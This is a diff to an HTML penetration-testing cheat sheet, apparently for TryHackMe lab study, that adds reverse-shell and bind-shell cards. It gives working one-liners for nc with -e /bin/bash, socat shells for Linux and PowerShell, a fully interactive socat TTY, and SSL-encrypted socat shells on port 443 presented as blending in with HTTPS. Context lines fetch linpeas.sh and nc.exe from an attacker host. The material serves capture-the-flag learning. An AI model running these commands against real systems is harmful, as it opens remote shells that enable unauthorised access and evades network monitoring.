@@ -447,7 +447,7 @@ hashid '$1$...'
   <!-- SHELLS -->
   <section class="section" id="shells" style="--pc:var(--access)">
     <div class="shead"><span class="bar"></span><span class="num">05</span><h2>Reverse Shells &amp; Stabilization</h2><span class="chev">▼</span></div>
-    <div class="sbody"><div class="grid">
+    <div class="sbody"><p class="note">📖 THM room: <a href="https://tryhackme.com/room/shellsfundamentals" target="_blank" rel="noopener">Shells Fundamentals</a> — shells</p><div class="grid">
 
       <div class="card"><h3>Listener <span class="tag">catch</span></h3>
         <div class="cmd"><code>nc -lvnp 4444
@@ -467,11 +467,16 @@ rlwrap nc -lvnp 4444              <span class="cm"># arrow-key history</span></c
       </div>
 
       <div class="card"><h3>Stabilize the shell <span class="tag">tty</span></h3>
+        <span class="lbl">on attacker first — note your size</span>
+        <div class="cmd"><code>stty size                         <span class="cm"># e.g. 50 220 (rows cols)</span></code><button class="copy">⧉</button></div>
+        <span class="lbl">in the shell</span>
         <div class="cmd"><code>python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
-<span class="cm"># then Ctrl+Z</span>
+<span class="cm"># then Ctrl+Z to background</span>
 stty raw -echo; fg
-<span class="cm"># press Enter twice</span></code><button class="copy">⧉</button></div>
+<span class="cm"># back in shell, apply your size:</span>
+stty rows 50 cols 220</code><button class="copy">⧉</button></div>
+        <p class="note">Term broken after exit? <code class="inl">stty sane</code> restores it; if blind, type <code class="inl">reset</code> + Enter. Prefix listener with <code class="inl">rlwrap</code> for history/arrows.</p>
       </div>
 
       <div class="card"><h3>File transfer <span class="tag">move</span></h3>
@@ -482,6 +487,49 @@ impacket-smbserver share . -smb2support</code><button class="copy">⧉</button><
         <div class="cmd"><code>wget http://LHOST/linpeas.sh
 curl http://LHOST/f -o f
 certutil -urlcache -f http://LHOST/nc.exe nc.exe   <span class="cm"># windows</span></code><button class="copy">⧉</button></div>
+      </div>
+
+      <div class="card"><h3>Reverse vs Bind <span class="tag">which?</span></h3>
+        <p class="note"><b>Reverse</b> — target connects back to <i>your</i> listener. Default choice: beats inbound firewalls / NAT on the target.</p>
+        <p class="note"><b>Bind</b> — target listens, <i>you</i> connect in. Use when the target's outbound is blocked but an inbound port is reachable.</p>
+        <span class="lbl">reverse (nc)</span>
+        <div class="cmd"><code>attacker: nc -lvnp 4444
+target:   nc LHOST 4444 -e /bin/bash</code><button class="copy">⧉</button></div>
+        <span class="lbl">bind (nc)</span>
+        <div class="cmd"><code>target:   nc -lvnp 8080 -e /bin/bash
+attacker: nc TARGET 8080</code><button class="copy">⧉</button></div>
+        <p class="note">No <code class="inl">-e</code> (OpenBSD nc)? Use the mkfifo one-liner above. <code class="inl">ncat</code> (nmap) adds SSL/proxy over plain <code class="inl">nc</code>.</p>
+      </div>
+
+      <div class="card"><h3>socat shells <span class="tag">stable</span></h3>
+        <span class="lbl">reverse</span>
+        <div class="cmd"><code>attacker: socat TCP-L:443 -
+target:   socat TCP:LHOST:443 EXEC:"bash -li"</code><button class="copy">⧉</button></div>
+        <span class="lbl">bind</span>
+        <div class="cmd"><code>target:   socat TCP-L:8088 EXEC:"bash -li"
+attacker: socat TCP:TARGET:8088 -</code><button class="copy">⧉</button></div>
+        <span class="lbl">windows (note ,pipes)</span>
+        <div class="cmd"><code>socat TCP:LHOST:443 EXEC:powershell.exe,pipes</code><button class="copy">⧉</button></div>
+        <p class="note">Not always pre-installed — transfer the <code class="inl">socat</code> binary first if missing.</p>
+      </div>
+
+      <div class="card"><h3>Fully interactive socat TTY <span class="tag">best</span></h3>
+        <div class="cmd"><code>attacker: socat TCP-L:5555 FILE:`tty`,raw,echo=0
+target:   socat TCP:LHOST:5555 EXEC:"bash -li",pty,stderr,sigint,setsid,sane</code><button class="copy">⧉</button></div>
+        <p class="note"><code class="inl">pty</code> real terminal · <code class="inl">stderr</code> show errors · <code class="inl">sigint</code> Ctrl+C · <code class="inl">setsid</code> job control · <code class="inl">sane</code> defaults. As good as SSH — <code class="inl">vim</code> &amp; Ctrl+Z work.</p>
+      </div>
+
+      <div class="card"><h3>Encrypted shells (SSL) <span class="tag">stealth</span></h3>
+        <span class="lbl">generate cert (once)</span>
+        <div class="cmd"><code>openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
+cat shell.key shell.crt &gt; shell.pem</code><button class="copy">⧉</button></div>
+        <span class="lbl">encrypted reverse</span>
+        <div class="cmd"><code>attacker: socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -
+target:   socat OPENSSL:LHOST:443,verify=0 EXEC:/bin/bash</code><button class="copy">⧉</button></div>
+        <span class="lbl">encrypted + full TTY</span>
+        <div class="cmd"><code>attacker: socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
+target:   socat OPENSSL:LHOST:443,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane</code><button class="copy">⧉</button></div>
+        <p class="note">Traffic blends in as HTTPS — use <b>443 / 8443 / 9443</b>. <code class="inl">verify=0</code> accepts the self-signed cert on both ends.</p>
       </div>
 
     </div></div>
